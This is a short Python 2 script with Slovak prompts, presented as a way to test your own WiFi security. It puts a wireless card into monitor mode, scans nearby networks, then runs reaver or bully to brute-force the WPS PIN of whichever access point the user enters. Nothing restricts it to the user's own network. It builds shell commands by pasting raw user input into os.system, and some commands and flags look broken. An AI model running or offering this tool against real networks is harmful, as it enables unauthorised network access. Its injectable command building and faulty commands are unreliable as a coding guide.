#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import time

print  "\n\n\n   Vytajte v kode na overenie správneho zabezpečenia vašej WIFI,\n\
pomocou napadnutia WPS. Tento program som pisal v jazyku python pod\n\
UBUNTU 14.04. Na jeho realne použitie odporúčam kali linux, Ubuntu. No mal by fungovať\n\
aj iních dystribúciách linuxu.\n\
No podmienkou sú balíčky : Airmon-ng , airodump-ng , reaver , bully.\n\n\
Tak ideme na vec :D : \n\n\n\n"
Sposob = raw_input ("Reaver/Bully R-B : ")
while Sposob not in set (["R", "B"]):
    Sposob = raw_input ("Reaver/Bully R-B : ") 
time.sleep (4)
print "Prepnutie sietovej karty do sledovacieho modu:\n "
time.sleep (4)
os.system ("sudo airmon-ng start wlan0")
time.sleep (4)
print "Sledovanie sieti:"
os.system ("sudo airodump mon0")
bssid = raw_input ("BSSID")
CH = raw_input ("chanel")
station = raw_input ("station:") 
#reaver 
if Sposob =="R":
    os.system ("reaver -i mon0 -b " + (bssid) + " -c " + (CH) + " -m " + (station) + " -vv -a -N -S -L")
#bully
if Sposob =="B":
    os.system ("bully -B mon0 -b " + (bssid) + " -c " + (CH) + " -s " + (station) + " -vv -a -N -S -L")